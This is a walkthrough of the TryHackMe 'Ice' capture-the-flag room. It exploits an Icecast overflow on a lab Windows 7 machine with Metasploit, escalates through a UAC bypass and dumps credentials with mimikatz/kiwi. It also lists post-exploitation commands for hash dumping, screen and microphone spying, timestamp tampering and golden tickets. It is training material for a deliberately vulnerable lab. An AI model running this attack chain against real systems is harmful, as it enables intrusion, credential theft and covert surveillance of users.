---
title: TryHackMe Room Ice
date: 2021-06-29T14:11:50+05:30
lastmod: 2021-06-29T14:11:50+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: "TryHackMe Room Ice walkthrough with step-by-step solutions — enumeration, exploitation, and privilege escalation on the Room Ice challenge room."
---
## ICE

> Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

## task 01: Connect

Nothing to do just follow the instructions.

---

## Task 02: Recon

### Things you should know

- https://nmap.org/book/synscan.html
- https://nmap.org/book/man-port-scanning-techniques.html

> for this lab: `nmap -sS -p- TARGET_IP`
  
### task 2.1

> Deploy the machine! This may take up to three minutes to start.

### Task 2.2

> Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'Nmap' prior to this room. 

### Task 2.3

> Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

* RDP runs on `3389`
  
  img
  
read about RDP [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)

### Task 2.4

> What service did nmap identify as running on port 8000? (First word of this service)
* Icecast
  ![img](https://i.imgur.com/8Cd0oyx.png)

### Task 2.5

> What does Nmap identify as the hostname of the machine? (All caps for the answer)
* DARK-PC
  ![](https://i.imgur.com/a0UXZ3Q.png)

---

## Task 03: Gain Access

![icecast](https://i.imgur.com/FFqM2ZK.png)

### task 3.1

> Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.

* `Execute Code Overflow`
  ![img](https://i.imgur.com/2KtaaBZ.png)

### task 3.2

> What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
 
* CVE-2004-1561 [Link](https://nvd.nist.gov/vuln/detail/CVE-2004-1561)
  
### task 3.3 
> Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

### task 3.4

> After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 

* `exploit/windows/http/icecast_header`

### 3.5

> Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

### 3.6

> Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

* `rhosts` for remote/target 

### 3.7

> First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

---

## Task 04: Escalate

we already have a open session from [Task03](#37). let's continue. 

### 4.1

> Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

* `meterpreter` : our metasploit shell

### 4.2

> What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.

* Dark
  Use `ps` to list process and you'll find this
  ```bash
  ...[snip]...

   2292  1528  Icecast2.exe   x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast

   # your pID might vary
   ...[snip]...
  ```

### 4.3 

> What build of Windows is the system?

* `sysinfo` in meterpreter reveal the answer. the ans is:
  
  ```bash
  meterpreter > sysinfo 
  Computer        : DARK-PC
  OS              : Windows 7 (6.1 Build `7601`, Service Pack 1).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  ```

### 4.4

> Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

* `x64` : look into [task 4.3](#43) for sysinfo output.

### 4.5

> Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

`please wait for command to finish` 

### 4.6

> Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

* `exploit/windows/local/bypassuac_eventvwr`

### 4.7

> Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

### 4.8

> Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`


### 4.9

> Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

* use `sessions` command to find out what session ID you have, usually that would be one (1)

### 4.10

> Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

* `lhost` : lhost stands for local host IP address, make sure you're using your VPN IP here, look for VPN IP using `ifconfig tun0`. 
  
### 4.11

> Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

### 4.12

> After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

### 4.13

> Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

### 4.14

> We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

* `SeTakeOwnershipPrivilege` 
  
  ```bash
  meterpreter > getprivs 

  Enabled Process Privileges
  ==========================

  Name
  ----
  ...
  SeTakeOwnershipPrivilege
  ...
  ```

---

## Task 05: Looting

### 5.1

> Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).

### 5.2 

> In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
> Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

* `spoolsv.exe` : run `ps` to get the process list

### 5.3

> Migrate to this process now with the command `migrate -N PROCESS_NAME`

* ` migrate -N spoolsv.exe

### 5.4

> Let's check what user we are now with the command `getuid`. What user is listed?

  ```bash
  meterpreter > getuid 
  Server username: NT AUTHORITY\SYSTEM
  ```

### 5.5

> Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

  ```bash
  meterpreter > load kiwi 
  Loading extension kiwi...
    .#####.   mimikatz 2.2.0 20191125 (x64/windows)
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
  '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
    '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

  Success.
```

### 5.6

> Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.

### 5.7

> Which command allows up to retrieve all credentials?

```bash
  Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    ...[snip]...
```

### 5.8

> Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

  ```zsh
  kerberos credentials
  ====================

  Username  Domain     Password
  --------  ------     --------
  (null)    (null)     (null)
  Dark      Dark-PC    Password01!
  dark-pc$  WORKGROUP  (null)
```---

### Task 06: Post-Exploitation

### 6.1

> Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

### 6.2

> What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

`hashdump` : look into `help` menu of Meterpreter. 

### 6.3

> While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

`screenshare`: a part of `Stdapi: User interface Commands`

### 6.4

> How about if we wanted to record from a microphone attached to the system?

`record_mic` : a part of `Stdapi: Webcam Commands`

### 6.5

> To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

`timestomp` 
```zsh
Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
```

### 6.6

> Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

> Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain

`golden_ticket_create` a part of `Kiwi` module

### 6.7

> One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

```zsh
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210630145839_default_10.10.220.240_host.windows.cle_567279.txt

```